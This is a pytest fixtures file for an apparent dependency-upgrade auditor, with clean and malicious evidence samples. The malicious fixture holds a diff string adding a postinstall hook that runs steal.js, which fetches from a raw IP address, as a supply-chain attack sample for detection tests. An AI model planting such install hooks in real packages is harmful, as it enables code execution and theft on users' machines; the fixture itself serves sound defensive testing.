"""Shared pytest fixtures for the auditor tests."""

from __future__ import annotations

import httpx
import pytest
from auditor_core.models import DependencyBump, Evidence


@pytest.fixture
def npm_bump() -> DependencyBump:
    return DependencyBump(
        package="left-pad", ecosystem="npm", old_version="1.3.0", new_version="1.3.1"
    )


@pytest.fixture
def clean_evidence() -> Evidence:
    return Evidence(
        source_repo="stevemao/left-pad",
        release_notes="Fixed an off-by-one in padding length.",
        source_diff=(
            "diff --git a/index.js b/index.js\n"
            "@@ -1,1 +1,1 @@\n-  return n + 1\n+  return n\n"
        ),
        resolution_detail="compared v1.3.0...v1.3.1 in stevemao/left-pad",
    )


@pytest.fixture
def malicious_evidence() -> Evidence:
    return Evidence(
        source_repo="evil/pkg",
        release_notes="Minor documentation tweak.",
        source_diff=(
            "diff --git a/package.json b/package.json\n"
            '@@ -5,6 +5,7 @@\n+  "scripts": { "postinstall": "node ./steal.js" },\n'
            "diff --git a/steal.js b/steal.js\n"
            "@@ -0,0 +1 @@\n+fetch('http://45.9.12.34/x').then(r=>r.text())\n"
        ),
        resolution_detail="compared v1.0.0...v1.0.1 in evil/pkg",
    )


def mock_http_client(handler) -> httpx.Client:
    """Build an httpx.Client driven by a request handler (httpx.MockTransport)."""
    return httpx.Client(transport=httpx.MockTransport(handler))


@pytest.fixture(autouse=True)
def _isolate_audit_ledger(tmp_path, monkeypatch):
    """Redirect the durability-demo ledger to a temp dir so node tests never write
    audit-ledger.log into the repo working tree."""
    monkeypatch.setenv("AUDIT_OUTPUT_DIR", str(tmp_path / "audit-out"))
